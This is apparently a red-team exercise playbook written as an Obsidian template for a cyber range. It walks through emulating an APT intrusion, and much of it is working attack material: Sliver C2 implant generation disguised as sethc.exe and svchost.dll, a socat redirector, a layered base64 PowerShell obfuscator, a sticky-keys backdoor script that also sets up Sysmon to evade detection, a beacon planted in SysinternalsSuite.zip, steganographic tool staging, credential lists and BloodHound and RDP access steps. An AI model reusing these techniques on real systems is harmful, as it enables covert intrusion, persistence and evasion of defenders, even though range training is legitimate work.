---
"creation date:": <% tp.file.creation_date() %>
"Modification Date:": <% tp.file.last_modified_date("dddd Do MMMM YYYY HH:mm:ss") %>
REDIR_REC1:
REDIR_REC2:
REDIR_LC21:
DOM_LC21: fisioterapiabb.it
REDIR_LC22:
DOM_LC22: rulourialuminiu.co.uk
REDIR_LC23:
DOM_LC23: bandabonga.fr
REDIR_SC21: 
DOM_SC22: sistemikan.com
REDIR_SC22:
DOM_SC21: busseylawoffice.com
IT_USER: william.jones@bull-it.lan
IT_PASS: 3edc4rfv#EDC$RFV
IT_JB1: 172.20.7.11
IT_JB2:
IT_JB3:
IT_DN: bull-it.lan
IT_NAMESERVER_IP: 
CUS_DN_T1: 
CUS_DN_T2: 
CUS_DN_T3: 
CUS_DN_T4: 
CUS_DN_T5: 
CUS_DN_TD: orange.lan
--- 


========== DAY 0 ACTIONS ==========

Pre-Read and Dependencies setup:

Obsidian variable - <% tp.frontmatter. %> (if you see this format, there are YAML variables at the top of this page that obsidian will automatically fill if you need them to make a clickscript)

Attack path inspiration documents: Operation Ghost Dukes

Resources required on Red Cell kali, build script (requires internet connection):

SLIVER:
```
#!/bin/bash

# create tools directory
mkdir ~/Desktop/tools
cd ~/Desktop/tools

# install sliver and all dependancies / binaries
# curl <https://sliver.sh/install|sudo> bash
sudo apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
sliverclient=$(curl -s <https://api.github.com/repos/BishopFox/sliver/releases/latest> | jq -r '.assets | .[] | .browser_download_url' | grep -E '(sliver-client_linux)$')
sliverserver=$(curl -s <https://api.github.com/repos/BishopFox/sliver/releases/latest> | jq -r '.assets | .[] | .browser_download_url' | grep -E '(sliver-server_linux)$')
sudo wget -O /usr/local/bin/sliver-server $sliverserver && sudo chmod 755 /usr/local/bin/sliver-server
sudo wget -O /usr/local/bin/sliver $sliverclient && sudo chmod 755 /usr/local/bin/sliver
sudo sliver-server unpack --force
sudo echo "[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/usr/local/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/sliver.service
sudo chmod 600 /etc/systemd/system/sliver.service
sudo systemctl start sliver
sudo sliver-server operator --name carter --lhost localhost --save /tmp
sudo mkdir -p ~/.sliver-client/configs
sudo mv /tmp/carter_localhost.cfg ~/.sliver-client/configs/
sudo chown -R kali:kali ~/.sliver-client/ && chmod 600 /home/kali/.sliver-client/configs/carter_localhost.cfg
sudo systemctl daemon-reload
```

OTHER DEPENDANCIES:
```
#!/bin/bash
# install dependancies
sudo apt update ; sudo apt upgrade -y
sudo apt install jq bloodhound seclists gradlew software-properties-common apt-transport-https wget chisel vsftpd dnscat2 raven
wget -q <https://packages.microsoft.com/keys/microsoft.asc> -O- | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] <https://packages.microsoft.com/repos/code> stable main"

# don't add sudo to this command
pipx install impacket

# get other files from the internet
wget <https://download.sysinternals.com/files/SysinternalsSuite.zip> #Sysinternals for Sysmon
wget <https://github.com/syvaidya/openstego/releases/download/openstego-0.8.6/openstego-0.8.6.zip> #OpenStego
wget <https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.8.1.0p1-Preview/OpenSSH-Win64-v9.8.1.0.msi> #for SSH
wget <https://javadl.oracle.com/webapps/download/AutoDL?BundleId=252043_8a1589aa0fe24566b4337beee47c2d29> #Dependancy for OpenStego

# git clones from github
git clone <https://github.com/peass-ng/PEASS-ng.git>
```
References:
Setup SSH on a Windows 2016 Server, 


REDIRECTORS

RECON Redirectors

mavin21c[.]dothome[.]co[.]kr

Long Haul C2 Redirectors

IPs

<% tp.frontmatter.REDIR_LC21 %>

<% tp.frontmatter.REDIR_LC22 %>

<% tp.frontmatter.REDIR_LC23 %> 

DNS Records

fisioterapiabb[.]it
rulourialuminiu[.]co[.]uk
bandabonga[.]fr

Short Haul C2 Redirectors

IPs

<% tp.frontmatter.REDIR_SC21 %>

<% tp.frontmatter.REDIR_SC22 %>

DNS Records

sistemikan[.]com
busseylawoffice[.]com

Fileserver Redirectors

DNS:

ceycarb[.]com
lorriratzlaff[.]com
motherlodebulldogclub[.]com
powerpolymerindustry[.]com
salesappliances[.]com

SOCAT redirector script:

#!/bin/bash
clear
echo "HTTP REDIR to TERRAN # - <TERRAN IP> ; PROXYING TRAFFIC FROM PORT 80 to 8086"
socat TCP4-LISTEN:80,fork TCP4:<TERRAN IP>:8086



Victim Setup

On all Domain Controllers

1. Run environmental setup script on the DCs (if required)

IT script here

Customer script here

Create a Scripts Share

Navigate to C:\\

Create a folder called Scripts

Right click the Scripts folder and navigate to properties>Sharing>Advanced Sharing

Check Share this folder, Share name: Scripts, Comments: Deployment Scripts

Permissions make sure Everyone has Read permissions

2. Enable RDP GPO

Configure the GPO

Computer Config

Policies

Windows Settings

Security Settings

Windows Firewall

Windows Firewall

Inbound Rules - New Rule

Pre-defined : Remote Desktop > Check all 3 boxes (Shadow, User UDP, User TCP) > Allow

Administrative Templates
 2. Windows Components
 	2. Remote Desktop Services
 		2. Remote Desktop Session Host
 			2. Connections
 				2. ENABLE
 					1. Allow users to connect remotely by using Remote Desktop Services
 					2. Limit number of connections - 5
 				3. DISABLE
 					1. Restrict Remote Desktop Services users to a single Remote Desktop Services session

Apply the GPO to the correct Security Groups and OUs

Authenticated Users

HelpDesk (IT\HelpDesk)

Remote Desktop Users

3. Enable Volume Shadow Copies on Windows Servers (Different Script Needed for Workstations):

Create shadow copy script: Backup-C-Drive.bat

Place this in C:\\Scripts

@echo off
vssadmin Add ShadowStorage /for=C: /on=C: /maxsize=UNBOUND
vssadmin create shadow /for=C:

Enable the script to run at Shutdown via GPO

Configure the GPO

Computer Configuration

Policies

Windows Settings

Scripts

Shutdown

Add > C:\\Scripts\\Backup-C-Drive.bat

Apply it to the entire Domain

Domain Controllers

Managed Computers

4. Ensure Connectivity Between Domains

Ping commands with IP and FQDN

5. Set up DNS records for all DCs

New Zone > IT.net > Default the rest

Enable the SSH port on the firewall via GPO



Resource Development

Making our environment ON TERRAN KALI

SLIVER C2 ON TERRAN KALI

CREATE A WEB CONNECTION TO A NEW KALI BOX IN TERRAN IP SPACE

Using SLIVER C2, generate a wireguard listener on UDP port 1193 and an mtls listener on TCP port 443 to the C2 redirector(s)

Create the SLIVER listener

../
sliver-server

Create the listeners in sliver-server cli:

wg -l 1193 -x 1190 -n 1192 -p
mtls -l 443 -p

Command Breakdown:

wg starts a wireguard listener

-l 1193 sets the listening port to 1193

-x 1190 sets the virtual tun interface key exchange port to udp 1190

-n 1192 sets the virtual tun interface listen port to 1192

If you mess this up, you must delete the entries made in ~/.sliver/configs/server.json

Create the SLIVER Implants

# if you're not in sliver already run this
sliver-server

Create Session Implant

generate --wg <% tp.frontmatter.REDIR_SC21 %>:1193,<% tp.frontmatter.REDIR_SC22 %>:1193 -X 1190 -T 1192 -N wgSess --os windows --arch amd64 --format exe --save "/home/kali/Desktop/tools/Service Pack/sethc.exe"

BE SURE TO CHANGE THE DOMAIN AND IP TO THE CORRECT IPS

SESSIONS in SLIVER are similar to any other remote connection. Responses are only limited by latency, and it is just the same as having a reverse shell. It generates a lot of traffic and is pretty loud.

Create Beacon Implant

generate beacon --mtls <% tp.frontmatter.REDIR_LC21 %>:443,<% tp.frontmatter.REDIR_LC22 %>:443 -e --os windows --arch amd64 --format shared -N mtlsBeac --save "/home/kali/Desktop/tools/Service Pack/svchost.dll"

BEACONS in SLIVER respond in time-based intervals as opposed to SESSIONS, which are interactive connections (there is no time or jitter, similar to a SSH session)

If you made the beacon wrong, you're going to have to remove it by typing implants rm <IMPLANT NAME> in the sliver-server cli

Exit the sliver CLI at this time

exit

Take note of the sha256 hash of the sethc.exe

One of our persistence methods will require the sha256 hash to be used.

sha256sum ./sethc.exe

this output will be the name of our session agent when it gets added to the Sysmon Archive folder on a victim machine

Save the hash for later. Copy and paste the sha256 hash of the sethc.exe file

mousepad sethchash.txt

Host the files on a webserver to stage the executables

cd "/home/kali/Desktop/tools/Service Pack"
python -m http.server 8086

Add range passwords into rockyou.txt

Since we don't have unlimited budget or time like real APTs, we will spread the range's credentials into rockyou.txt so we can still crack passwords but do it the right way.

cd /home/kali/Desktop/tools
nano passlist.txt ; awk 'NF' passlist.txt > temp.txt && mv temp.txt passlist.txt

Paste the following into the passlist file

Simspace1!Simspace1!
aIpE9Y+7j#5X
tQc5FwHc@B6r
c+K$u#9j5$nB
Y@9K@2Q5@B$H
q2M@xAx+K+r#
c@5U8j+f2R3P
S$tL9W#Pg6rA
w#I9X9mT4#yS
x$JyP9+t2J9#
cA+I+g@6$p$6
P9@X+Wb@N@pG
n8$Qq#JrD8f2
p3Hu8#8W5X@t
z+b#P@4$PrH9
a$Mg5a8z@iW9
p#y#KpJ9B9Jo
fQ7P4tT+yI$V
S#qTcI#i+Z2B
PPa2x7@w9V5L
UXo9VfGk4sH$
KJ+t+d7W+oX4
AS+x8c$4f$H9
f4i#4x9W4M@5
R6F+j8I7+5S8
UVw4eKz$q2p@
j+9@e@sX4@iJ
B7s8tEoB+zG6
w#u+C#m5N$f7
V9$H6X$8r6m8
TVi$Ev#s$8$M
s#4x+F#I#3#3
w+N#C+W2iW#F
s@Da2+9@y8H2
nI6@x6@Da6$6
c@6E@n6Ze3kD
YM5F6Rs#2$Xq
s4A$e4#2n8P9
z6Y$N3H6r+e2
c$J5z3B9BuN$
BF#cG$4m+Qd2
D6a@b7#5K8W+
F+c2qJ@2hKa$
E@2$c8S4Wn+4
K8tG+9b+B6#6
fT7a4#UsT@yZ
y+9w+s@Q7f6a
t$tBb3aF+Br2
Z+9sV5B$q8+K
t+C+Q+wJ#P2g
ZY@j$F9+Ju7b
G8yR2Df+K6e8
oH@R5#Y8t$c@
cC2x@X#a4+7e
MQ#J6N5WiR6B
qT6#iRn+mN2T
v2C8$2cN+Ry$
h9n#N3h5W+3g
D+U8@5d2t2i#
P@G$5i+o+dEf
K3G4vBt+k$x@
Q$3m5$B3A9Ia
S2G#3@i9+2Vq
aW7$4G+SwB@8
A#s+s4U+iV6h
HB3#6yZj3#H$
e#o9#c$M9H3@
w$3h7J+5$3R5
E@m5Q9o3f6f@
Z#2+3Q#tKi5A
F4T8E7PhJmE#
U7#2#U9K2x+3
q#Qd2qX#7#2#
w4G#cI+D+7yY
QHw$Bd8Cu3A9
Z@4d#Fk+9a+9
D3v5Mj4@U$t@
T+M+2A3D+c#W
M5+rKu#3@p4s
FDrSt$u8+u@R
d+L5C$iPo@H#
yVj4T4+Se6Y+
M8@D#D$4#m2G
rB9X7K+3uN@M
Z3F$c8b9Sp#3
mL@n2a3D@pP4
V$7+9YiU+7Q$
CXa9D+r9#U3+
f7+4A@G@6i@H
X2qY$6@Cv9w2
KG+Vs7e5$dF4

Distribute the passwords randomly into rockyou.txt with the following, also validating they exist in rockyou.txt after the operation, and display the line number:

sudo bash -c 'for i in {1..91}; do sed -i "$(shuf -i 1-9000000 -n 1) a $(sed -n "${i}p" passlist.txt)" /usr/share/wordlists/rockyou.txt; done' ; grep -n -F -f passlist.txt /usr/share/wordlists/rockyou.txt

Download the Java installer into PCTE

On your host machine download:

https://javadl.oracle.com/webapps/download/AutoDL?BundleId=252043_8a1589aa0fe24566b4337beee47c2d29

Upload the file to PCTE environment



Create a script to set up our environment:

cd "/home/kali/Desktop/tools" ; nano setup.sh ; chmod +x setup.sh ; ./setup.sh

Copy and paste below into the script:

#!/bin/bash
cd ~/Desktop/tools
rm -rf yankM_Ransomware
rm -rf pythonInstaller
mv PEASS-ng ..

mkdir "Service Pack" # create a folder for all files and tools to be dropped within the environments
cd "Service Pack" 
mkdir "Wallpaper Engine" # DOWNLOAD THE WALLPAPER IMAGES THAT YOU DROP INTO THE ENVIRONMENT HERE

mkdir "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack" # place all tools that will be used in the victim domain here
cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
cp "/home/kali/Desktop/tools/jre-8u451-windows-i586.exe" ./jre-8u451-windows-i586.exe
cp "/home/kali/Desktop/tools/HiveNightmare-master/Release/HiveNightmare.exe" ./Back-up-Client_v8.7.66.exe
cp "/home/kali/Desktop/tools/OpenSSH-Win64-v9.8.1.0.msi" ./OpenSSH.msi
cp "/home/kali/Desktop/tools/zips/SysinternalsSuite.zip" ./SysinternalsSuite.zip
cp -r "/home/kali/Desktop/tools/openstego-0.8.6" "./HelpDesk"
cp "/home/kali/Desktop/tools/svchost.dll" .
cp "/home/kali/Desktop/tools/sethc.exe" .
cd "HelpDesk"
rm LICENSE openstego.sh README
mv openstego.bat HelpDesk.bat ; mv openstego.ico HelpDesk.ico
mv "./lib/openstego.jar" "./lib/HelpDesk.jar"

OpenStego.bat configuration change

To obfuscate the OpenStego.jar, we'll need to change some of the .bat file that runs the program.

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack/HelpDesk"
mousepad HelpDesk.bat

Change the following lines:

# change the allocated memory space
#FROM: 
set JAVA_OPTS=-Xmx1024m
#TO: 
set JAVA_OPTS=-Xmx6g

# search for, and change anything that has the following (it happens 2x in the files):
#FROM:
openstego.jar
#TO:
HelpDesk.jar

Copy the sysmonconfig-export.xml

nano a file into the HelpDesk Service Pack folder that we just created

cd "/home/kali/Desktop/tools/Service Pack" ; nano sysmonconfig-export.xml ; cp sysmonconfig-export.xml "./HelpDesk Service Pack/"

Copy and paste the following into the file and DELETE THE NEWLINES BETWEEN EACH LINE

<Sysmon schemaversion="4.90">  
<ArchiveDirectory>PerfMon</ArchiveDirectory>  
<EventFiltering>  
    <FileDelete onmatch="exclude">  
      <Image condition="contains">Prefetch</Image>  
      <TargetFilename condition="contains">.pf</TargetFilename>  
      <Image condition="contains">splunk</Image>  
      <Image condition="contains">WSM</Image>  
    </FileDelete>  
    <FileDelete onmatch="include">  
      <TargetFilename condition="contains">.exe</TargetFilename>  
    </FileDelete>  
</EventFiltering>  
</Sysmon>

Create the run.bat script in the Service Pack folder

cd "/home/kali/Desktop/tools/Service Pack" ; nano run.bat

Copy the following into the file:

powershell -ep bypass "C:\Users\Public\'HelpDesk Service Pack'\sysmonsetup.ps1"

doge64commander.sh

Copy and paste this into a file into /home/kali/Desktop/tools named doge64commander.sh ensure you also run chmod +x on the file to make it executable

cd /home/kali/Desktop/tools ; nano doge64commander.sh ; chmod +x doge64commander.sh

#!/bin/bash
echo "What command would you like to encode? "
read command
enccmd=$(echo $command | base64)

echo "How many iterations? "
read counter
for (( i=1; i<=$counter; i++)); do
  start=$(date +%s%N)
  echo 'iex $($x=[Convert]::FromBase64String("'$enccmd'");$y=[System.Text.Encoding]::UTF8.GetString($x);$y)' > commanded.ps1
  enccmd=$(cat commanded.ps1 | base64)
  end=$(date +%s%N)
  echo "Time elapsed for loop $i: $(($((end - start)) / 1000000)) ms"
  done

Create the sysmonsetup.ps1 script

Run doge64commander.sh to encode the script

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
/home/kali/Desktop/tools/doge64commander.sh ; mv commanded.ps1 sysmonsetup.ps1

Encode the following and iterate it 15 to 25 times

takeown /f "C:\\windows\\System32\\sethc.exe" /a > $null ; icacls.exe C:\\Windows\\System32\\sethc.exe /grant "Everyone:F" > $null ; cd \"C:\\Users\\Public\\'HelpDesk Service Pack'\"; Set-ItemProperty -Path C:\\Windows\\System32\\svchost.dll -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) > $null ; copy sethc.exe C:\\Windows\\System32\\sethc.exe -force ; sysmon.exe -i -accepteula ; sysmon.exe -c sysmonconfig-export.xml ; del sethc.exe -force; sysmon.exe -c -- ; del sysmonconfig-export.xml -force 

Add the beacon into the SysinternalsSuite.zip

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
unzip -q SysinternalsSuite.zip -d temp && cp ../svchost.dll temp/ && rm SysinternalsSuite.zip && cd temp && zip -q -r ../SysinternalsSuite.zip . && cd .. && rm -rf temp

Getting 4k - 8k images for STEGO

Download Images: https://unsplash.com/collections/18134858/8k-wallpapers 

Downloaded a few to use, one of them can have a bear, and it will be the cover for getting tools in

Use the same method to download them as we did with the java installer

MAKE SURE THE IMAGE HAS THE SAME EXTENSION AS IT DID WHEN IT WAS ON YOUR HOST MACHINE

cd "/home/kali/Desktop/tools/Service Pack/Wallpaper Engine"

# ENSURE THE FILE EXTENSION MATCHES THE ORIGINAL FILE
wget -O <DESCRIPTIVE NAME> <LINK TO PCTE DOWNLOAD>

Making our environment ON BULL-IT Kali Machine:

Add range passwords into rockyou.txt

Since we don't have unlimited budget or time like real APTs, we will spread the range's credentials into rockyou.txt so we can still crack passwords but do it the right way.

cd /home/kali/Desktop/tools
nano passlist.txt ; awk 'NF' passlist.txt > temp.txt && mv temp.txt passlist.txt

Paste the following into the passlist file

Simspace1!Simspace1!
aIpE9Y+7j#5X
tQc5FwHc@B6r
c+K$u#9j5$nB
Y@9K@2Q5@B$H
q2M@xAx+K+r#
c@5U8j+f2R3P
S$tL9W#Pg6rA
w#I9X9mT4#yS
x$JyP9+t2J9#
cA+I+g@6$p$6
P9@X+Wb@N@pG
n8$Qq#JrD8f2
p3Hu8#8W5X@t
z+b#P@4$PrH9
a$Mg5a8z@iW9
p#y#KpJ9B9Jo
fQ7P4tT+yI$V
S#qTcI#i+Z2B
PPa2x7@w9V5L
UXo9VfGk4sH$
KJ+t+d7W+oX4
AS+x8c$4f$H9
f4i#4x9W4M@5
R6F+j8I7+5S8
UVw4eKz$q2p@
j+9@e@sX4@iJ
B7s8tEoB+zG6
w#u+C#m5N$f7
V9$H6X$8r6m8
TVi$Ev#s$8$M
s#4x+F#I#3#3
w+N#C+W2iW#F
s@Da2+9@y8H2
nI6@x6@Da6$6
c@6E@n6Ze3kD
YM5F6Rs#2$Xq
s4A$e4#2n8P9
z6Y$N3H6r+e2
c$J5z3B9BuN$
BF#cG$4m+Qd2
D6a@b7#5K8W+
F+c2qJ@2hKa$
E@2$c8S4Wn+4
K8tG+9b+B6#6
fT7a4#UsT@yZ
y+9w+s@Q7f6a
t$tBb3aF+Br2
Z+9sV5B$q8+K
t+C+Q+wJ#P2g
ZY@j$F9+Ju7b
G8yR2Df+K6e8
oH@R5#Y8t$c@
cC2x@X#a4+7e
MQ#J6N5WiR6B
qT6#iRn+mN2T
v2C8$2cN+Ry$
h9n#N3h5W+3g
D+U8@5d2t2i#
P@G$5i+o+dEf
K3G4vBt+k$x@
Q$3m5$B3A9Ia
S2G#3@i9+2Vq
aW7$4G+SwB@8
A#s+s4U+iV6h
HB3#6yZj3#H$
e#o9#c$M9H3@
w$3h7J+5$3R5
E@m5Q9o3f6f@
Z#2+3Q#tKi5A
F4T8E7PhJmE#
U7#2#U9K2x+3
q#Qd2qX#7#2#
w4G#cI+D+7yY
QHw$Bd8Cu3A9
Z@4d#Fk+9a+9
D3v5Mj4@U$t@
T+M+2A3D+c#W
M5+rKu#3@p4s
FDrSt$u8+u@R
d+L5C$iPo@H#
yVj4T4+Se6Y+
M8@D#D$4#m2G
rB9X7K+3uN@M
Z3F$c8b9Sp#3
mL@n2a3D@pP4
V$7+9YiU+7Q$
CXa9D+r9#U3+
f7+4A@G@6i@H
X2qY$6@Cv9w2
KG+Vs7e5$dF4

Distribute the passwords randomly into rockyou.txt with the following, also validating they exist in rockyou.txt after the operation, and display the line number:

sudo bash -c 'for i in {1..91}; do sed -i "$(shuf -i 1-9000000 -n 1) a $(sed -n "${i}p" passlist.txt)" /usr/share/wordlists/rockyou.txt; done' ; grep -n -F -f passlist.txt /usr/share/wordlists/rockyou.txt

Download the java installer into the /home/kali/Desktop/tools folder

use wget on the kali to get the link from PCTE like we did on the Terran machine

cd /home/kali/Desktop/tools
wget -O jre-8u451-windows-i586.exe <LINK PCTE GIVES YOU> 

Download the agents from the webserver

cd "/home/kali/Desktop/tools/Service Pack"
wget http://<DENMARK REDIR>:/sethc.exe

wget http://<DENMARK REDIR>/svchost.dll

Create a script to set up our environment:

cd "/home/kali/Desktop/tools" ; nano setup.sh ; chmod +x setup.sh ; ./setup.sh

Copy and paste below into the script:

#!/bin/bash
cd ~/Desktop/tools
rm -rf yankM_Ransomware
rm -rf pythonInstaller
mv PEASS-ng ..

mkdir "Service Pack" # create a folder for all files and tools to be dropped within the environments
cd "Service Pack" 
mkdir "Wallpaper Engine" # DOWNLOAD THE WALLPAPER IMAGES THAT YOU DROP INTO THE ENVIRONMENT HERE

mkdir "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack" # place all tools that will be used in the victim domain here
cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
cp "/home/kali/Desktop/tools/jre-8u451-windows-i586.exe" ./jre-8u451-windows-i586.exe
cp "/home/kali/Desktop/tools/HiveNightmare-master/Release/HiveNightmare.exe" ./Back-up-Client_v8.7.66.exe
cp "/home/kali/Desktop/tools/OpenSSH-Win64-v9.8.1.0.msi" ./OpenSSH.msi
cp "/home/kali/Desktop/tools/zips/SysinternalsSuite.zip" ./SysinternalsSuite.zip
cp -r "/home/kali/Desktop/tools/openstego-0.8.6" "./HelpDesk"
cp "/home/kali/Desktop/tools/svchost.dll" .
cp "/home/kali/Desktop/tools/sethc.exe" .
cd "HelpDesk"
rm LICENSE openstego.sh README
mv openstego.bat HelpDesk.bat ; mv openstego.ico HelpDesk.ico
mv "./lib/openstego.jar" "./lib/HelpDesk.jar"

OpenStego.bat configuration change

To obfuscate the OpenStego.jar, we'll need to change some of the .bat file that runs the program.

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack/HelpDesk"
mousepad HelpDesk.bat

Change the following lines:

# change the allocated memory space
#FROM: 
set JAVA_OPTS=-Xmx1024m
#TO: 
set JAVA_OPTS=-Xmx6g

# search for, and change anything that has the following (it happens 2x in the files):
#FROM:
openstego.jar
#TO:
HelpDesk.jar

Copy the sysmonconfig-export.xml

nano a file into the HelpDesk Service Pack folder that we just created

cd "/home/kali/Desktop/tools/Service Pack" ; nano sysmonconfig-export.xml ; cp sysmonconfig-export.xml "./HelpDesk Service Pack/"

Copy and paste the following into the file and DELETE THE NEWLINES BETWEEN EACH LINE

<Sysmon schemaversion="4.90">  
<ArchiveDirectory>PerfMon</ArchiveDirectory>  
<EventFiltering>  
    <FileDelete onmatch="exclude">  
      <Image condition="contains">Prefetch</Image>  
      <TargetFilename condition="contains">.pf</TargetFilename>  
      <Image condition="contains">splunk</Image>  
      <Image condition="contains">WSM</Image>  
    </FileDelete>  
    <FileDelete onmatch="include">  
      <TargetFilename condition="contains">.exe</TargetFilename>  
    </FileDelete>  
</EventFiltering>  
</Sysmon>

Create the run.bat script in the Service Pack folder

cd "/home/kali/Desktop/tools/Service Pack" ; nano run.bat

Copy the following into the file:

powershell -ep bypass "C:\Users\Public\'HelpDesk Service Pack'\sysmonsetup.ps1"

doge64commander.sh

Copy and paste this into a file into /home/kali/Desktop/tools named doge64commander.sh ensure you also run chmod +x on the file to make it executable


cd /home/kali/Desktop/tools ; nano doge64commander.sh ; chmod +x doge64commander.sh

#!/bin/bash
echo "What command would you like to encode? "
read command
enccmd=$(echo $command | base64)

echo "How many iterations? "
read counter
for (( i=1; i<=$counter; i++)); do
  start=$(date +%s%N)
  echo 'iex $($x=[Convert]::FromBase64String("'$enccmd'");$y=[System.Text.Encoding]::UTF8.GetString($x);$y)' > commanded.ps1
  enccmd=$(cat commanded.ps1 | base64)
  end=$(date +%s%N)
  echo "Time elapsed for loop $i: $(($((end - start)) / 1000000)) ms"
  done

Create the sysmonsetup.ps1 script

Run doge64commander.sh to encode the script

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
/home/kali/Desktop/tools/doge64commander.sh ; mv commanded.ps1 sysmonsetup.ps1

Encode the following and iterate it 15 to 25 times

takeown /f "C:\\windows\\System32\\sethc.exe" /a > $null ; icacls.exe C:\\Windows\\System32\\sethc.exe /grant "Everyone:F" > $null ; cd \"C:\\Users\\Public\\'HelpDesk Service Pack'\"; Set-ItemProperty -Path C:\\Windows\\System32\\svchost.dll -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) > $null ; copy sethc.exe C:\\Windows\\System32\\sethc.exe -force ; sysmon.exe -i -accepteula ; sysmon.exe -c sysmonconfig-export.xml ; del sethc.exe -force; sysmon.exe -c -- ; del sysmonconfig-export.xml -force 

Add the beacon into the SysinternalsSuite.zip

cd "/home/kali/Desktop/tools/Service Pack/HelpDesk Service Pack"
unzip -q SysinternalsSuite.zip -d temp && cp ../svchost.dll temp/ && rm SysinternalsSuite.zip && cd temp && zip -q -r ../SysinternalsSuite.zip . && cd .. && rm -rf temp

Getting 4k - 8k images for STEGO

Download Images: https://unsplash.com/collections/18134858/8k-wallpapers 

Downloaded a few to use, one of them can have a bear, and it will be the cover for getting tools in

Use the same method to download them as we did with the java installer

MAKE SURE THE IMAGE HAS THE SAME EXTENSION AS IT DID WHEN IT WAS ON YOUR HOST MACHINE

cd "/home/kali/Desktop/tools/Service Pack/Wallpaper Engine"

# ENSURE THE FILE EXTENSION MATCHES THE ORIGINAL FILE
wget -O <DESCRIPTIVE NAME> <LINK TO PCTE DOWNLOAD>

Test the Steganography tool

cd ~/Desktop/tools
touch stegtest.txt
echo "This is a test to see if OpenStego works" > stegtest.txt
# hide the test file in the image with OpenStego
java -Xmx6g -jar "./Service Pack/HelpDesk Service Pack/HelpDesk/lib/HelpDesk.jar" embed -a RandomLSB -mf "stegtest.txt" -cf "Service Pack/Wallpaper Engine/<NAME OF IMAGE>" -sf hidden.png -e -p MWMzRjRuZ0IzNzczclRoNG5TNDU1eVA0bmQ0 -A AES128

Validate you can pull the file out of the image

java -Xmx6g -jar "./Service Pack/HelpDesk Service Pack/HelpDesk/lib/HelpDesk.jar" extract -sf hidden.png -xf extracted.txt -p MWMzRjRuZ0IzNzczclRoNG5TNDU1eVA0bmQ0

Verify the files match eachother

sha256sum "stegtest.txt" "extracted.txt" # verify you can retrieve the .txt

The thomas-bonometti-mx6BzzKvWIw-unsplash.png can be replaced with any image you downloaded onto your machine.

The -Xmx6g allocates more RAM to the java instance, if not it will crash and you won't be able to do anything with the .png you stegged

 ========== DAY 1 ACTIONS ==========

Reconnaissance 

Using the 3rd Party Bull-IT domain

Our initial access point will come from this domain. Previously, IceFang has infiltrated and now controls computers within this domain, which we can use to our advantage. The target critical infrastructure network has a two-way trust from BULL-IT which enables us to have a foothold  in their network. We will begin by enumerating from the outside and pivot inside once we have a better understanding of our environment.

Note: We have persistence within the BULL-IT network with valid credentials

alexander.jackson@bull-it.lan

3edc4rfv#EDC$RFV

amelia.martin@bull-it.lan

3edc4rfv#EDC$RFV

ava.miller@bull-it.lan

3edc4rfv#EDC$RFV

benjamin.davis@bull-it.lan

3edc4rfv#EDC$RFV

charlotte.white@bull-it.lan

3edc4rfv#EDC$RFV

daniel.thompson@bull-it.lan

3edc4rfv#EDC$RFV

ella.robinson@bull-it.lan

3edc4rfv#EDC$RFV

emma.johnson@bull-it.lan

3edc4rfv#EDC$RFV

ethan.harris@bull-it.lan

3edc4rfv#EDC$RFV

harper.garcia@bull-it.lan

3edc4rfv#EDC$RFV

henry.anderson@bull-it.lan

3edc4rfv#EDC$RFV

isabella.taylor@bull-it.lan

3edc4rfv#EDC$RFV

james.smith@bull-it.lan

3edc4rfv#EDC$RFV

lucas.moore@bull-it.lan

3edc4rfv#EDC$RFV

matthew.martinez@bull-it.lan

3edc4rfv#EDC$RFV

mia.thomas@bull-it.lan

3edc4rfv#EDC$RFV

michael.williams@bull-it.lan

3edc4rfv#EDC$RFV

olivia.brown@bull-it.lan

3edc4rfv#EDC$RFV

sophia.wilson@bull-it.lan

3edc4rfv#EDC$RFV

william.jones@bull-it.lan

3edc4rfv#EDC$RFV

ON THE BULL-IT Machine:

Enumerate the Bull-IT network with Bloodhound

For internal scanning, we will do some slow-roll enumeration once we land on a box. on the inside. LOLBAS here is preferred. tracert , ping and any AD modules that we can use would be great.

Enumerate the Domain with DNS queries

nslookup the BULL-IT domain

nslookup bull-it.lan

Launching Bloodhound

On Kali Machine

BloodHound is a powerful enumeration tool that makes Active Directory enumeration very simple.

First, we must start the neo4j console, change the password and then login to the bloodhound server we host locally

sudo echo "starting neo4j server"; sudo neo4j console &

This launches the client and starts the neo4j server

We now open Firefox, and change the default passwords

http://localhost:7474

username: neo4j

password: neo4j

New Password: IceFang

Confirm New Password: IceFang

Close the browser and launch BloodHound

bloodhound &

username: neo4j

password: IceFang

You will be greeted with a white page with nothing but a toolbar on the right side.

Go to Settings on the bottom of the toolbar, and enable Dark Mode to save your eyeballs

We can now get data for bloodhound from the IT.net workstation onto our kali.

cd /home/kali/Desktop/tools
bloodhound-python -u lucas.moore@bull-it.lan -p '3edc4rfv#EDC$RFV' -d bull-it.lan -ns 172.17.2.20 -c All --zip

You should get something that looks similar to this as an output if you're successful:

On that right-hand pane, click on the Upload Data, and use the GUI to upload the .zip file generated from the previous command in the /home/kali/Desktop/tools directory:

Once you upload the data, there will be a large selection of options, click `Analysis` at the top and select `Map Domain Trusts` to see where we will pivot into:



notice the following trusts:

to gather the IP of these domains, we can do an nslookup to discover what the IPv4 addresses are and then enumerate the ip space


Initial Access

RDP From the Bull-IT HelpDesk to Customer workstations

On Kali Machine

We are going to need access to our tools here. We are possibly going to be able to RDP over the files using the following commands:

xfreerdp3 /u:'lucas.moore@bull-it.lan' /p:'3edc4rfv#EDC$RFV' /v:<HR TARGET IP> /drive:/home/kali/Desktop/tools/Service\ Pack,'Local	Disk	(Cː)'

This connects from our attacker IP to the IT Helpdesk provider's network and connects our kali's /home/kali/Desktop/tools/Service Pack/ folder so we can drop files.

